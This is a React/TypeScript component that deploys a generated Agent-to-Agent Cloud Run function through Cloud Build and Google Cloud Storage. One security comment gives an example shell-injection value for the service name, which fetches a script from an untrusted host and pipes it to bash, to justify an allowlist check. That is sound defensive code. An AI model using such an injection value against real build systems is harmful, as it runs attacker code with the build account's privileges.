/**
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


import React, { useState, useEffect, useRef } from 'react';
import * as api from '../../services/apiService';
import { GcsBucket } from '../../types';
import { assertValidGcpResourceName } from '../../services/shellSafety';
import { useModalA11y } from '../../hooks/useModalA11y';

import JSZip from 'jszip';

interface A2aDeployModalProps {
    isOpen: boolean;
    onClose: () => void;
    projectNumber: string;
    serviceName: string;
    region: string;
    files: { name: string; content: string }[];
    onBuildTriggered?: (buildId: string) => void;
}

const NodeIcon: React.FC<{ type: string }> = ({ type }) => {
    switch (type) {
        case 'function': return <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-purple-400" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M12.316 3.051a1 1 0 01.633 1.265l-4 12a1 1 0 01-1.898-.632l4-12a1 1 0 011.265-.633zM5.707 6.293a1 1 0 010 1.414L3.414 10l2.293 2.293a1 1 0 11-1.414 1.414l-3-3a1 1 0 010-1.414l3-3a1 1 0 011.414 0zm8.586 0a1 1 0 011.414 0l3 3a1 1 0 010 1.414l-3 3a1 1 0 11-1.414-1.414L16.586 10l-2.293-2.293a1 1 0 010-1.414z" clipRule="evenodd" /></svg>;
        default: return <div className="h-4 w-4 bg-gray-500 rounded-full"></div>;
    }
}

const A2aDeployModal: React.FC<A2aDeployModalProps> = ({ 
    isOpen, 
    onClose, 
    projectNumber, 
    serviceName, 
    region: _region, 
    files, 
    onBuildTriggered 
}) => {
    const containerRef = useRef<HTMLDivElement>(null);
    const [projectId, setProjectId] = useState(projectNumber);
    const [isResolvingId, setIsResolvingId] = useState(false);
    
    // Bucket State
    const [buckets, setBuckets] = useState<GcsBucket[]>([]);
    const [selectedBucket, setSelectedBucket] = useState<string>('');
    const [isLoadingBuckets, setIsLoadingBuckets] = useState(false);
    const [bucketError, setBucketError] = useState<string | null>(null);

    // Deployment state
    const [isDeploying, setIsDeploying] = useState(false);
    const [error, setError] = useState<string | null>(null);
    const [logs, setLogs] = useState<string[]>([]);
    
    const [isPermissionsExpanded, setIsPermissionsExpanded] = useState(false);

    useModalA11y({
        isOpen,
        onClose,
        containerRef,
        preventClose: isDeploying,
    });
    const [leftTab, setLeftTab] = useState<'architecture' | 'docs' | 'cloud_build'>('architecture');

    useEffect(() => {
        if (!isOpen) return;
        
        // Reset state
        setError(null);
        setLogs([]);
        setIsDeploying(false);
        setProjectId(projectNumber); 
        setBuckets([]);
        setSelectedBucket('');
        setIsPermissionsExpanded(false);
        setLeftTab('architecture');

        // 1. Resolve Project ID
        const resolveProject = async () => {
            setIsResolvingId(true);
            try {
                const p = await api.getProject(projectNumber);
                if (p.projectId) setProjectId(p.projectId);
            } catch (e) {
                console.warn("Could not resolve Project ID string");
            } finally {
                setIsResolvingId(false);
            }
        };
        resolveProject();
    }, [isOpen, projectNumber]);

    // Fetch Buckets
    useEffect(() => {
        if (!isOpen || !projectId) return;
        
        const fetchBuckets = async () => {
            setIsLoadingBuckets(true);
            setBucketError(null);
            try {
                const res = await api.listBuckets(projectId);
                const items = res.items || [];
                setBuckets(items);
                if (items.length > 0) {
                    setSelectedBucket(items[0].name);
                }
            } catch (e: unknown) {
                console.error("Failed to fetch buckets", e);
                setBucketError(e instanceof Error ? e.message : "Failed to list buckets.");
            } finally {
                setIsLoadingBuckets(false);
            }
        };
        fetchBuckets();
    }, [isOpen, projectId]);

    const addLog = (msg: string) => setLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);

    const getPreviewBuildConfig = () => {
        const bucket = selectedBucket || '[STAGING_BUCKET]';
        const sourceObjectName = `source/${serviceName}-TIMESTAMP.zip`;
        
        return {
            source: {
                storageSource: {
                    bucket: bucket,
                    object: sourceObjectName
                }
            },
            steps: [
                {
                    name: 'gcr.io/google.com/cloudsdktool/cloud-sdk',
                    entrypoint: 'bash',
                    args: ['deploy.sh'],
                    env: [`GOOGLE_CLOUD_PROJECT=${projectId}`]
                }
            ],
            timeout: "600s"
        };
    };

    const getDeployScript = () => {
        return files.find(f => f.name === 'deploy.sh')?.content || '# deploy.sh not found';
    };

    const getReadmeContent = () => {
        return `# A2A Function: ${serviceName}

This is a serverless Cloud Run function implementing the Agent-to-Agent (A2A) protocol.

## Features
- **Discovery**: Exposes \`/.well-known/agent.json\` for tool discovery.
- **Invocation**: Handles JSON-RPC 2.0 requests at \`/invoke\`.
- **Framework**: Built with Flask and Vertex AI SDK.

## Deployment
This function is deployed using Google Cloud Build.
1. Source code is zipped and uploaded to GCS.
2. Cloud Build retrieves the source.
3. It executes \`deploy.sh\` to:
   - Build and deploy the container to Cloud Run.
   - Configure IAM permissions (if enabled).
   - Set the \`AGENT_URL\` environment variable for self-discovery.
`;
    };

    const handleDeploy = async () => {
        if (!selectedBucket) {
            setError("Please select a GCS bucket for staging.");
            return;
        }

        setIsDeploying(true);
        setError(null);
        setLogs([]);
        addLog(`Starting deployment for ${serviceName}...`);

        try {
            // SECURITY (F-01): `serviceName` is interpolated unquoted-by-template into
            // the generated deploy.sh (`SERVICE_NAME="..."`), which Cloud Build executes
            // via `entrypoint: bash`. A value such as `x"; curl untrusted.example.com/s.sh | bash; #` would
            // run arbitrary commands as the build service account. Cloud Run service
            // names must already match this allowlist, so no working deploy is affected.
            assertValidGcpResourceName(serviceName, 'Service name');
            // SECURITY (F-01): `projectId` is also interpolated below, into the build
            // step's `env` entry. It is deliberately NOT asserted: Cloud Build passes
            // env entries to the container directly rather than through a shell, so it
            // is not an injection sink here, and the opaque-id allowlist would reject
            // legacy domain-scoped project IDs ("example.com:proj") -- breaking a
            // working deploy for no security benefit.

            // 1. Create Zip
            const zip = new JSZip();
            addLog("Preparing source files...");
            files.forEach(f => {
                zip.file(f.name, f.content);
            });

            const blob = await zip.generateAsync({ type: 'blob' });
            
            // 2. Upload Source to GCS
            const sourceObjectName = `source/${serviceName}-${Date.now()}.zip`;
            addLog(`Uploading source to gs://${selectedBucket}/${sourceObjectName}...`);
            addLog(`File size: ${(blob.size / 1024).toFixed(2)} KB`);
            
            const file = new File([blob], "source.zip", { type: "application/zip" });
            await api.uploadFileToGcs(selectedBucket, sourceObjectName, file, projectId);
            
            // 3. Construct Cloud Build Config
            const buildConfig = {
                source: {
                    storageSource: {
                        bucket: selectedBucket,
                        object: sourceObjectName
                    }
                },
                steps: [
                    {
                        name: 'gcr.io/google.com/cloudsdktool/cloud-sdk',
                        entrypoint: 'bash',
                        args: ['deploy.sh'],
                        env: [`GOOGLE_CLOUD_PROJECT=${projectId}`]
                    }
                ],
                timeout: "600s"
            };

            // 4. Trigger Build
            addLog('Triggering Cloud Build...');
            const buildOp = await api.createCloudBuild(projectId, buildConfig);
            const triggeredBuildId = buildOp.metadata?.build?.id || 'unknown';
            
            if (onBuildTriggered && triggeredBuildId !== 'unknown') {
                onBuildTriggered(triggeredBuildId);
            }

            addLog(`Build triggered! ID: ${triggeredBuildId}`);
            addLog(`You can close this window. The build progress will be tracked globally.`);
            // Don't auto-close immediately so user can see the build ID log
            // onClose(); 

        } catch (err: unknown) {
            const errMsg = err instanceof Error ? err.message : 'Deployment failed';
            setError(errMsg);
            addLog(`Error: ${errMsg}`);
            setIsDeploying(false);
        }
    };

    const cloudBuildSa = `${projectNumber}@cloudbuild.gserviceaccount.com`;
    const grantPermissionsCommand = `gcloud projects add-iam-policy-binding ${projectId} \\
  --member="serviceAccount:${cloudBuildSa}" \\
  --role="roles/run.admin"

gcloud projects add-iam-policy-binding ${projectId} \\
  --member="serviceAccount:${cloudBuildSa}" \\
  --role="roles/iam.serviceAccountUser"

gcloud projects add-iam-policy-binding ${projectId} \\
  --member="serviceAccount:${cloudBuildSa}" \\
  --role="roles/artifactregistry.admin"`;

    if (!isOpen) return null;

    return (
        <div
            className="fixed inset-0 bg-black bg-opacity-80 z-50 flex justify-center items-center p-4"
            role="dialog"
            aria-modal="true"
            aria-labelledby="a2a-deploy-modal-title"
            onClick={() => {
                if (!isDeploying) onClose();
            }}
        >
            <div
                ref={containerRef}
                tabIndex={-1}
                onClick={(e) => e.stopPropagation()}
                className="bg-gray-800 rounded-xl shadow-2xl w-full max-w-6xl h-[85vh] flex flex-col border border-gray-700"
            >
                {/* Header */}
                <div className="p-4 border-b border-gray-700 flex justify-between items-center bg-gray-900 rounded-t-xl">
                    <h2 id="a2a-deploy-modal-title" className="text-xl font-bold text-white flex items-center gap-2">
                        <span className="text-purple-400">Deploy Function:</span> {serviceName}
                    </h2>
                    <div className="flex items-center gap-4">
                        <span className="text-xs text-gray-400 bg-gray-700 px-2 py-1 rounded-full">{files.length} Files Generated</span>
                        <button
                            type="button"
                            onClick={onClose}
                            className="text-gray-400 hover:text-white"
                            disabled={isDeploying}
                            aria-label="Close dialog"
                        >
                            &times;
                        </button>
                    </div>
                </div>

                <div className="flex flex-1 overflow-hidden">
                    {/* Left Pane: Tabs & Content */}
                    <div className="w-1/3 bg-gray-800/50 flex flex-col border-r border-gray-700">
                        <div className="flex border-b border-gray-700">
                            <button 
                                onClick={() => setLeftTab('docs')} 
                                className={`flex-1 py-3 text-sm font-medium ${leftTab === 'docs' ? 'text-white border-b-2 border-blue-500 bg-gray-700/50' : 'text-gray-400 hover:text-white'}`}
                            >
                                Documentation
                            </button>
                            <button 
                                onClick={() => setLeftTab('architecture')} 
                                className={`flex-1 py-3 text-sm font-medium ${leftTab === 'architecture' ? 'text-white border-b-2 border-blue-500 bg-gray-700/50' : 'text-gray-400 hover:text-white'}`}
                            >
                                Architecture
                            </button>
                            <button 
                                onClick={() => setLeftTab('cloud_build')} 
                                className={`flex-1 py-3 text-sm font-medium ${leftTab === 'cloud_build' ? 'text-white border-b-2 border-blue-500 bg-gray-700/50' : 'text-gray-400 hover:text-white'}`}
                            >
                                Cloud Build
                            </button>
                        </div>

                        <div className="flex-1 overflow-y-auto p-6">
                            {leftTab === 'docs' ? (
                                <div className="prose prose-invert prose-sm max-w-none">
                                    <pre className="whitespace-pre-wrap font-sans text-sm text-gray-300">
                                        {getReadmeContent()}
                                    </pre>
                                </div>
                            ) : leftTab === 'architecture' ? (
                                <div className="flex flex-col items-center space-y-6">
                                    {/* Function Node */}
                                    <div className="flex flex-col items-center">
                                        <div className="w-24 h-24 bg-purple-900/50 border-2 border-purple-500 rounded-full flex items-center justify-center shadow-lg shadow-purple-900/20">
                                            <NodeIcon type="function" />
                                        </div>
                                        <span className="mt-3 text-white font-bold text-sm">A2A Function</span>
                                        <span className="text-xs text-gray-500 font-mono mt-1">{serviceName}</span>
                                        <span className="text-[10px] text-gray-600 bg-gray-800 px-2 py-0.5 rounded mt-1">Cloud Run</span>
                                    </div>
                                    <p className="text-center text-xs text-gray-500 mt-4">
                                        This function exposes standard A2A endpoints for tool discovery and invocation.
                                    </p>
                                </div>
                            ) : (
                                <div className="space-y-4">
                                    <p className="text-xs text-gray-400">
                                        This is the configuration payload that will be sent to the Cloud Build API based on your current settings.
                                    </p>
                                    <div className="bg-black p-3 rounded-md overflow-x-auto border border-gray-700">
                                        <pre className="text-xs text-green-300 font-mono whitespace-pre-wrap">
                                            {JSON.stringify(getPreviewBuildConfig(), null, 2)}
                                        </pre>
                                    </div>
                                    
                                    <div className="space-y-2">
                                        <p className="text-xs text-gray-400 font-bold">Cloud Run Deploy Script (deploy.sh)</p>
                                        <div className="bg-black p-3 rounded-md overflow-x-auto border border-gray-700">
                                            <pre className="text-xs text-blue-300 font-mono whitespace-pre-wrap">
                                                {getDeployScript()}
                                            </pre>
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>

                    {/* Right Pane: Configuration Form */}
                    <div className="flex-1 p-6 overflow-y-auto bg-gray-800">
                        <div className="space-y-6 max-w-2xl mx-auto">
                            
                            {/* Project Info */}
                            <div className="bg-blue-900/20 border border-blue-800 p-3 rounded-md flex justify-between items-center">
                                <div>
                                    <p className="text-xs text-blue-300 uppercase font-semibold">Target Project ID</p>
                                    <p className="text-sm text-white font-mono">{projectId}</p>
                                </div>
                                {isResolvingId && <div className="animate-spin rounded-full h-4 w-4 border-t-2 border-b-2 border-blue-400"></div>}
                            </div>

                            {/* Staging Bucket */}
                            <div>
                                <h3 className="text-lg font-medium text-white mb-3">1. Build Configuration</h3>
                                <label className="block text-sm font-medium text-gray-300 mb-1">Cloud Build Staging Bucket</label>
                                <div className="flex gap-2">
                                    <select 
                                        value={selectedBucket} 
                                        onChange={(e) => setSelectedBucket(e.target.value)} 
                                        className="w-full bg-gray-700 border-gray-600 rounded-md px-3 py-2 text-sm text-white focus:ring-blue-500"
                                        disabled={isLoadingBuckets || isDeploying}
                                    >
                                        {buckets.length === 0 && <option value="">{isLoadingBuckets ? 'Loading...' : 'No buckets found'}</option>}
                                        {buckets.map(b => <option key={b.id} value={b.name}>{b.name}</option>)}
                                    </select>
                                </div>
                                {bucketError && <p className="text-xs text-red-400 mt-1">{bucketError}</p>}
                                <p className="text-xs text-gray-500 mt-1">GCS bucket to store the source code for Cloud Build.</p>
                            </div>

                            {/* Permissions Warning */}
                            <div>
                                <h3 className="text-lg font-medium text-white mb-3">2. Permissions</h3>
                                <div className="bg-yellow-900/20 border border-yellow-700/50 p-3 rounded-md">
                                    <button 
                                        onClick={() => setIsPermissionsExpanded(!isPermissionsExpanded)}
                                        className="flex items-center justify-between w-full text-left"
                                    >
                                        <span className="text-sm font-semibold text-yellow-200 flex items-center gap-2">
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" /></svg>
                                            Cloud Build Permissions Required
                                        </span>
                                        <svg xmlns="http://www.w3.org/2000/svg" className={`h-4 w-4 text-yellow-200 transition-transform ${isPermissionsExpanded ? 'rotate-180' : ''}`} viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" /></svg>
                                    </button>
                                    {isPermissionsExpanded && (
                                        <div className="mt-3">
                                            <p className="text-xs text-yellow-100 mb-2">
                                                Cloud Build needs <strong>Cloud Run Admin</strong> and <strong>Service Account User</strong> roles to deploy this service. Run this once in your terminal:
                                            </p>
                                            <div className="bg-black/50 p-2 rounded border border-yellow-900/50 relative group">
                                                 <pre className="text-[10px] text-yellow-50 whitespace-pre-wrap font-mono">
                                                    {grantPermissionsCommand}
                                                </pre>
                                                <button
                                                    onClick={() => navigator.clipboard.writeText(grantPermissionsCommand)}
                                                    className="absolute top-2 right-2 px-2 py-1 bg-yellow-900/80 hover:bg-yellow-800 text-yellow-200 text-[10px] rounded opacity-0 group-hover:opacity-100 transition-opacity"
                                                >
                                                    Copy
                                                </button>
                                            </div>
                                        </div>
                                    )}
                                </div>
                            </div>

                            {/* Logs & Errors */}
                            {(logs.length > 0 || error) && (
                                <div className="bg-black rounded-lg p-3 border border-gray-700 font-mono text-xs max-h-40 overflow-y-auto">
                                    {error && <div className="text-red-400 mb-1">Error: {error}</div>}
                                    {logs.map((log, i) => <div key={i} className="text-gray-300">{log}</div>)}
                                </div>
                            )}

                            {/* Action Button */}
                            <div className="pt-4">
                                <button
                                    onClick={handleDeploy}
                                    disabled={isDeploying}
                                    className="w-full py-3 bg-gradient-to-r from-blue-600 to-teal-500 hover:from-blue-500 hover:to-teal-400 text-white font-bold rounded-lg shadow-lg transform transition-transform active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed flex justify-center items-center gap-2"
                                >
                                    {isDeploying ? (
                                        <>
                                            <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-b-2 border-white"></div>
                                            Deploying via Cloud Build...
                                        </>
                                    ) : (
                                        <>
                                            <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-11a1 1 0 10-2 0v2H7a1 1 0 100 2h2v2a1 1 0 102 0v-2h2a1 1 0 100-2h-2V7z" clipRule="evenodd" /></svg>
                                            Launch Build & Deploy
                                        </>
                                    )}
                                </button>
                                <p className="text-center text-xs text-gray-500 mt-2">
                                    Triggers a Google Cloud Build job in your project to package and deploy this function.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default A2aDeployModal;
